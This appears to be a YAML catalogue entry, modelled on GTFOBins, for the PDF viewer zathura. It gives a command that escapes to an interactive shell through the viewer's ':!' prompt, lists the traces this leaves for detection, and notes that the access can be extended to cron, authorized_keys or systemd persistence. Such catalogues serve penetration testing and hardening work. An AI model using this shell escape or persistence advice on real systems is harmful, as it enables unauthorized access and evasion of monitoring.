---
name: zathura
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: This requires a running X server.
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    zathura
    :! /bin/sh -c 'exec /bin/sh 0<&1'
  notes: The interaction happens in a GUI window, while the shell is dropped in the terminal.
references:
- https://gtfobins.github.io/gtfobins/zathura/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
